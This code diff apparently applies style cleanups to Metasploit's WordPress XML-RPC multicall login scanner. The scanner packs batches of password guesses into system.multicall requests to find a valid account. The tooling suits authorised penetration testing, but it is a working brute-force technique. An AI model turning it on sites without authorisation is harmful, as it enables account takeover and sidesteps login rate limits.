@@ -1,12 +1,11 @@
+# frozen_string_literal: true
 require 'metasploit/framework/login_scanner/http'
 require 'nokogiri'
 
 module Metasploit
   module Framework
     module LoginScanner
-
       class WordpressMulticall < HTTP
-
         # @!attribute passwords
         # @return [Array]
         attr_accessor :passwords
@@ -27,7 +26,6 @@ module Metasploit
         # @return [String]
         attr_accessor :wordpress_url_xmlrpc
 
-
         def set_default
           @wordpress_url_xmlrpc ||= 'xmlrpc.php'
           @block_wait ||= 6
@@ -46,32 +44,33 @@ module Metasploit
           # Wordpress limitation which is 1700 maximum.
           passwords.each_slice(chunk_size) do |pass_group|
             document = Nokogiri::XML::Builder.new do |xml|
-              xml.methodCall {
+              xml.methodCall do
                 xml.methodName("system.multicall")
-                xml.params {
-                xml.param {
-                xml.value {
-                xml.array {
-                xml.data {
-                pass_group.each  do |pass|
-                  xml.value  {
-                  xml.struct {
-                  xml.member {
-                  xml.name("methodName")
-                  xml.value  { xml.string("wp.getUsersBlogs") }}
-                  xml.member {
-                  xml.name("params")
-                  xml.value {
-                  xml.array {
-                  xml.data  {
-                  xml.value {
-                  xml.array {
-                  xml.data  {
-                  xml.value { xml.string(user) }
-                  xml.value { xml.string(pass) }
-                  }}}}}}}}}
-                end
-                }}}}}}
+                xml.params do
+                xml.param do
+                xml.value do
+                xml.array do
+                xml.data do
+                  pass_group.each do |pass|
+                    xml.value  do
+                    xml.struct do
+                    xml.member do
+                      xml.name("methodName")
+                      xml.value { xml.string("wp.getUsersBlogs") }
+                    end
+                    xml.member do
+                    xml.name("params")
+                    xml.value do
+                    xml.array do
+                    xml.data  do
+                    xml.value do
+                    xml.array do
+                    xml.data  do
+                      xml.value { xml.string(user) }
+                      xml.value { xml.string(pass) }
+                    end end end end end end end end end
+                  end
+                end end end end end end
             end
             xml_payloads << document.to_xml
           end
@@ -89,7 +88,7 @@ module Metasploit
               'method'  => 'POST',
               'uri'     => normalize_uri("#{base_uri}/#{wordpress_url_xmlrpc}"),
               'data'    => xml,
-              'ctype'   =>'text/xml'
+              'ctype' => 'text/xml'
             }
 
           client = Rex::Proto::Http::Client.new(host, port, {}, ssl, ssl_version, proxies, http_username, http_password)
@@ -97,13 +96,10 @@ module Metasploit
           req  = client.request_cgi(opts)
           res  = client.send_recv(req)
 
-          if res && res.code != 200
-            sleep(block_wait * 60)
-          end
+          sleep(block_wait * 60) if res && res.code != 200
 
           @res = res
         end
-
 
         # Attempts to login.
         #
@@ -117,19 +113,18 @@ module Metasploit
             req_xml = Nokogiri::Slop(xml)
             res_xml = Nokogiri::Slop(@res.to_s.scan(/<.*>/).join)
             res_xml.search("methodResponse/params/param/value/array/data/value").each_with_index do |value, i|
-              result =  value.at("struct/member/value/int")
-              if result.nil?
-                pass = req_xml.search("data/value/array/data")[i].value[1].text.strip
-                credential.private = pass
-                result_opts = {
-                  credential: credential,
-                  host: host,
-                  port: port,
-                  protocol: 'tcp'
-                }
-                result_opts.merge!(status: Metasploit::Model::Login::Status::SUCCESSFUL)
-                return Result.new(result_opts)
-              end
+              result = value.at("struct/member/value/int")
+              next unless result.nil?
+              pass = req_xml.search("data/value/array/data")[i].value[1].text.strip
+              credential.private = pass
+              result_opts = {
+                credential: credential,
+                host: host,
+                port: port,
+                protocol: 'tcp'
+              }
+              result_opts[:status] = Metasploit::Model::Login::Status::SUCCESSFUL
+              return Result.new(result_opts)
             end
           end
 
@@ -140,13 +135,10 @@ module Metasploit
             protocol: 'tcp'
           }
 
-          result_opts.merge!(status: Metasploit::Model::Login::Status::INCORRECT)
-          return Result.new(result_opts)
+          result_opts[:status] = Metasploit::Model::Login::Status::INCORRECT
+          Result.new(result_opts)
         end
-
       end
     end
   end
 end
-
-
